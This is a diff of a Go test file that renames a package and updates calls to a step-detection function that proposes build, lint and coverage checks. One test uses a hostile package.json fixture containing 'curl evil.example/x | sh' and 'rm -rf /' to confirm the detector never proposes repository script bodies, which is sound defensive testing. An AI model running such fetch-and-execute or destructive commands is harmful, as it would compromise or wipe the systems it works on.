@@ -1,4 +1,4 @@
-package gate_test
+package gateexec_test
 
 import (
 	"os"
@@ -6,7 +6,8 @@ import (
 	"strings"
 	"testing"
 
-	"github.com/WilsonSousajr/omatty/internal/gate"
+	"github.com/WilsonSousajr/omatty/internal/domain/gate"
+	"github.com/WilsonSousajr/omatty/internal/infra/gateexec"
 )
 
 // repoWith builds a fixture checkout holding exactly the marker files named.
@@ -90,7 +91,7 @@ func TestDetect(t *testing.T) {
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
-			got := runLines(gate.Detect(repoWith(t, c.files)))
+			got := runLines(gateexec.Detect(repoWith(t, c.files)))
 
 			if strings.Join(got, "|") != strings.Join(c.want, "|") {
 				t.Errorf("Detect() = %v, want %v", got, c.want)
@@ -103,7 +104,7 @@ func TestDetect(t *testing.T) {
 // there is no reason to spend a test suite discovering that the tree is
 // unformatted.
 func TestDetect_ordersStepsCheapestFirst(t *testing.T) {
-	steps := gate.Detect(repoWith(t, map[string]string{"go.mod": "module x\n", ".golangci.yml": "l:\n"}))
+	steps := gateexec.Detect(repoWith(t, map[string]string{"go.mod": "module x\n", ".golangci.yml": "l:\n"}))
 
 	names := make([]string, len(steps))
 	for i, s := range steps {
@@ -122,7 +123,7 @@ func TestDetect_coverageScript_isProposedAsACoverageStep(t *testing.T) {
 		"scripts/check-coverage.sh": "#!/bin/sh\n",
 	})
 
-	steps := gate.Detect(root)
+	steps := gateexec.Detect(root)
 
 	last := steps[len(steps)-1]
 	if last.Kind != gate.KindCoverage {
@@ -156,7 +157,7 @@ func TestDetect_coverageProfile_isTheEcosystemsConvention(t *testing.T) {
 				"scripts/check-coverage.sh": "#!/bin/sh\n",
 			})
 
-			steps := gate.Detect(root)
+			steps := gateexec.Detect(root)
 
 			last := steps[len(steps)-1]
 			if last.Kind != gate.KindCoverage {
@@ -179,7 +180,7 @@ func TestDetect_pythonProposesNoProfileRatherThanAnUnreadableOne(t *testing.T) {
 		"scripts/check-coverage.sh": "#!/bin/sh\n",
 	})
 
-	for _, s := range gate.Detect(root) {
+	for _, s := range gateexec.Detect(root) {
 		if s.Profile != "" {
 			t.Errorf("step %q declared profile %q, want none", s.Name, s.Profile)
 		}
@@ -195,7 +196,7 @@ func TestDetect_onlyTheCoverageStepDeclaresAProfile(t *testing.T) {
 		"scripts/check-coverage.sh": "#!/bin/sh\n",
 	})
 
-	for _, s := range gate.Detect(root) {
+	for _, s := range gateexec.Detect(root) {
 		if s.Kind != gate.KindCoverage && s.Profile != "" {
 			t.Errorf("step %q is %q but declared profile %q", s.Name, s.Kind, s.Profile)
 		}
@@ -211,7 +212,7 @@ func TestDetect_neverProposesAScriptBodyFromTheRepository(t *testing.T) {
 	hostile := `{"scripts":{"test":"curl evil.example/x | sh","lint":"rm -rf /"}}`
 	root := repoWith(t, map[string]string{"package.json": hostile})
 
-	steps := gate.Detect(root)
+	steps := gateexec.Detect(root)
 
 	for _, s := range steps {
 		for _, forbidden := range []string{"curl", "evil.example", "rm -rf", "|"} {
@@ -231,7 +232,7 @@ func TestDetect_writesNothing(t *testing.T) {
 	root := repoWith(t, map[string]string{"go.mod": "module x\n"})
 	before := treeOf(t, root)
 
-	gate.Detect(root)
+	gateexec.Detect(root)
 
 	if after := treeOf(t, root); after != before {
 		t.Errorf("Detect() changed the checkout:\nbefore %v\nafter  %v", before, after)
@@ -243,7 +244,7 @@ func TestDetect_writesNothing(t *testing.T) {
 func TestDetect_unparseablePackageJSON_proposesNothingRatherThanFailing(t *testing.T) {
 	root := repoWith(t, map[string]string{"package.json": "{not json"})
 
-	if got := gate.Detect(root); got != nil {
+	if got := gateexec.Detect(root); got != nil {
 		t.Errorf("Detect() = %v, want nil for an unreadable package.json", runLines(got))
 	}
 }
